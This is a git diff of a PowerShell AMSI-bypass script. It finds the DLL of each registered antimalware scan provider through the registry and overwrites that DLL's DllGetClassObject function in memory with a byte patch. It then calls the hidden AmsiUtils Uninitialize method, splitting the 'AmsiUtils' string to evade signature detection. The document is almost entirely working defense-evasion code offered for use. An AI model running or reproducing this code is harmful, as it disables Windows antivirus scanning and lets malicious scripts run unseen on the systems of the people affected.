@@ -5,6 +5,8 @@
 # Add-Type causes the code to be written to a temporary file on the disk, then csc.exe is used to compile this code into a binary
 # Artifacts on disk may cause AV detection, solution - reflection
 
+# Providers registry enumeration implemented by: https://github.com/R-Secure/AMSI-Bypasses
+
 function Get-ProcAddress {
     Param(
         [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
@@ -25,7 +27,6 @@ function Get-ProcAddress {
     # Return the address of the function
     return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 }
-
 function Get-DelegateType
 {
     Param
@@ -53,24 +54,41 @@ function Get-DelegateType
         
     Write-Output $TypeBuilder.CreateType()
 }
-
 $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
 $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
-$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
+$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
+$LoadLibraryDelegate)
 $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
 $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
-$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
+$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
+$GetProcAddressDelegate)
 $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
-$VistualProtectDelegate =  Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)
+$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
+$VirtualProtectDelegate)
 
-$hModule = $LoadLibrary.Invoke("MpOav.dll")
-$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, "DllGetClassObject")
+$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
 $p = 0
-$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) | Out-Null
-$ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 6)
+
+foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
+{
+    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
+    $dllPath = Get-ItemPropertyValue -Name '(Default)' $registry -ErrorAction SilentlyContinue
+    if ($dllPath)
+    {
+        $providerDLL = Split-Path $dllPath -leaf
+        $dll = $providerDLL -replace '"', ""
+        $hDLL = $LoadLibrary.Invoke($dll) 
+        if ($hdll -ne 0)
+        {
+            Write-host "[*] Provider found - " $providerDLL
+            $Address = $GetProcAddress.Invoke($hDLL, "DllGetClassObject")        
+            $VirtualProtect.Invoke($Address, [uint32]$Patch.Length, 0x40, [ref]$p)
+            [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+        }
+    }
+}
 
 $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
-$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize 
+$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
